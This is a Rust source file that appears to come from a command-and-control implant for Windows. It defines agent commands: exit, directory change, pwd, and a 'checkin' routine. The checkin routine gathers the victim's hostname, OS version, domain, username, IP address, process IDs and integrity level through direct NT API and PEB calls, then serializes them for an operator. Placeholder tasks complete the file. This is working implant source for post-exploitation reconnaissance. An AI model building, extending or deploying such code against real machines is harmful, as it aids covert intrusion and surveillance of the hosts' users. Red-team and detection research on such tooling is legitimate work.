use core::ffi::c_void;
use libc_print::libc_println;
use mod_agentcore::{instance, instance_mut};
use mod_win32::{
    nt_current_process,
    nt_get_adapters_info::get_adapters_info,
    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
    nt_path::change_directory,
    nt_peb::{
        get_current_directory, get_image_path_name, get_os, get_os_version_info, get_process_name,
        get_user_domain, get_username,
    },
    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
    nt_time::delay,
};
use rs2_communication_protocol::{
    communication_structs::{
        checkin::{Checkin, PartialCheckin},
        task_output::TaskOutput,
    },
    metadata::Metadata,
};

use crate::{common::AgentErrors, init::checkin_from_raw};

/// Terminates the current process based on the provided exit type.
///
/// This function invokes the NT API `NtTerminateProcess` to terminate the current process
/// if `exit_type` is 1. The termination process is a blocking operation.
///
/// # Parameters
/// - `exit_type`: Specifies the type of exit. If set to 1, the process is terminated.
///
/// # NT API:
/// - Calls `NtTerminateProcess` from the Windows NT API.
///
/// # Safety
/// - This function interacts with low-level NT APIs and terminates the process, which may lead
///   to data loss or corruption if used improperly.
pub fn command_exit(exit_type: i32) {
    // Example of an asynchronous operation before termination
    if exit_type == 1 {
        // The actual process termination remains a synchronous operation
        unsafe {
            let ntstatus = instance().ntdll.nt_terminate_process.run(-1isize as _, 0);

            // Check if the termination was successful
            if ntstatus < 0 {
                // Print an error message if the termination failed
                libc_println!("NtTerminateProcess failed: {:#X}", ntstatus);
            }
        }
    }
}

/// Gathers system and process metadata, creates a `Checkin` object, and serializes it to JSON format.
///
/// This function retrieves various system information and process details, performing actions equivalent to several Windows APIs.
///
/// # Functions involved
/// - `get_computer_name_ex`: Retrieves the DNS hostname of the computer. Replicates the functionality of the `GetComputerNameExW` Windows API.
/// - `get_os`: Retrieves the operating system information from the Process Environment Block (PEB).
/// - `get_os_version_info`: Fetches detailed OS version information. Replicates the functionality of `RtlGetVersion`.
/// - `get_adapters_info`: Retrieves information about the network adapters, including IP addresses. Replicates the functionality of `GetAdaptersInfo`.
/// - `get_pid_and_ppid`: Retrieves the current process ID (PID) and the parent process ID (PPID).
/// - `get_process_integrity`: Determines the integrity level of the current process. Replicates the functionality of `GetTokenInformation` with `TokenIntegrityLevel`.
/// - `get_user_domain`: Retrieves the user's domain name.
/// - `get_username`: Retrieves the username of the current user. Replicates the functionality of `GetUserNameW`.
/// - `get_process_name`: Retrieves the name of the current process.
/// - `get_image_path_name`: Retrieves the image path of the current process.
///
/// # Returns
/// - `Result<String, serde_json::Error>`: A JSON string of the `Checkin` object on success, or a `serde_json::Error` on serialization failure.
///
/// # Safety
/// This function uses several `unsafe` blocks to interact with system-level APIs and perform raw pointer dereferencing.
/// The caller must ensure that the system and memory are in a valid state before calling this function.
///
pub fn command_checkin() -> Result<String, serde_json::Error> {
    // Get the computer name in DNS Hostname format.
    let mut buffer = Vec::new();
    let mut size: u32 = 0;
    let success = unsafe {
        get_computer_name_ex(
            ComputerNameFormat::ComputerNameDnsHostname,
            &mut buffer,
            &mut size,
        )
    };

    // Initialize a string to hold the hostname.
    let mut hostname = String::new();
    if success {
        // Convert the computer name buffer (UTF-16) to a Rust `String`.
        hostname = String::from_utf16_lossy(&buffer)
            .trim_end_matches('\0') // Remove any trailing null characters.
            .to_string();
    } else {
        // Log an error if retrieving the computer name fails.
        libc_println!("[!] get_computer_name_ex failed");
    }

    // Retrieve the operating system information from the PEB (Process Environment Block).
    let os_info_peb = unsafe { get_os() };

    // Retrieve more detailed operating system version information.
    let get_os_version_info_result = unsafe { get_os_version_info() };
    let mut operating_system = String::new();
    if get_os_version_info_result.is_ok() {
        let os_version_info = get_os_version_info_result.unwrap();

        // Construct a string representing the operating system version.
        operating_system.push_str(&format!(
            "{} {}.{}.{} (Platform ID: {})",
            os_info_peb,
            os_version_info.dw_major_version,
            os_version_info.dw_minor_version,
            os_version_info.dw_build_number,
            os_version_info.dw_platform_id,
        ));
    }

    // Retrieve information about the network adapters (e.g., IP addresses).
    let ip_addresses = unsafe { get_adapters_info() };

    // Retrieve the current process ID (PID) and parent process ID (PPID).
    let (pid, ppid) = unsafe { get_pid_and_ppid() };

    // Retrieve the integrity level of the current process.
    let rid = unsafe { get_process_integrity(nt_current_process()) };

    let first_ip = ip_addresses.unwrap().get(0).unwrap().1.clone();
    // Create a `Checkin` object with the gathered metadata.
    let checkin = unsafe {
        Box::new(Checkin::new(PartialCheckin {
            operative_system: operating_system, // OS details.
            hostname: hostname,                 // Computer hostname.
            domain: get_user_domain(),          // User's domain name.
            username: get_username(),           // User's username.
            ip: first_ip,                       // Network adapter IP addresses.
            process_id: pid as i64,             // Process ID.
            parent_process_id: ppid as i64,     // Parent Process ID.
            process_name: get_process_name(),   // Name of the current process.
            integrity_level: rid,               // Process integrity level.
            cwd: get_image_path_name(),         // Current working directory.
        }))
    };

    // Set the `Checkin` data in the global instance for further access.
    unsafe { instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void) };

    // Serialize the `Checkin` object to a JSON string and return it.
    serde_json::to_string(unsafe { checkin_from_raw(instance().pcheckindata.as_mut().unwrap()) })
}

/// Changes the current working directory to the specified path.
///
/// This function attempts to change the directory using an internal mechanism that
/// utilizes the `NtOpenFile` NT API. If the operation is successful, it returns the new
/// current directory as a `String`. In case of an error, it returns a corresponding `Error`.
///
/// # Nt API involved
/// - `NtOpenFile`: Used internally to open the specified directory.
///
/// # Parameters
/// - `path`: A string slice representing the directory path to change to.
///
/// # Returns
/// - `Result<String, AgentErrors>`: On success, returns the new current directory as a `String`.
///   On failure, returns an `AgentErrors::ChangeDirectoryFailed` error.
pub fn command_cd(path: &str) -> Result<String, AgentErrors> {
    // Attempt to change the directory
    if change_directory(path) < 0 {
        // If the change_directory function returns a negative value, an error occurred
        return Err(AgentErrors::ChangeDirectoryFailed);
    }

    // If successful, retrieve the new current directory and return it
    let current_dir = get_current_directory();
    Ok(current_dir)
}

/// Retrieves the current working directory.
///
/// This function retrieves the current directory by accessing the `Process Environment Block (PEB)`.
/// If the directory cannot be retrieved, it returns an `Error`.
///
/// # Details
/// - The function reads the current directory path directly from the PEB, which stores
///   environment information for the running process.
///
/// # Returns
/// - `Result<String, AgentErrors>`: On success, returns the current directory as a `String`.
///   On failure, returns an `AgentErrors::PrintWorkingDirectoryFailed` error.
pub fn command_pwd() -> Result<String, AgentErrors> {
    // Retrieve the current working directory from the PEB
    let current_dir = get_current_directory();

    // Check if the current directory was successfully retrieved
    if current_dir.is_empty() {
        // If the directory is empty, an error occurred during retrieval
        return Err(AgentErrors::PrintWorkingDirectoryFailed);
    }

    // If successful, return the current directory
    Ok(current_dir)
}

// #[cfg(feature = "std-runtime")]
// Simulated task that takes 2 seconds to complete.
pub fn task_type_a(metadata: Metadata) -> TaskOutput {
    delay(1);
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type A".to_string());
    output
}

// #[cfg(feature = "std-runtime")]
// Simulated task that takes 3 seconds to complete.
pub fn task_type_b(metadata: Metadata) -> TaskOutput {
    delay(12);
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type B".to_string());
    output
}
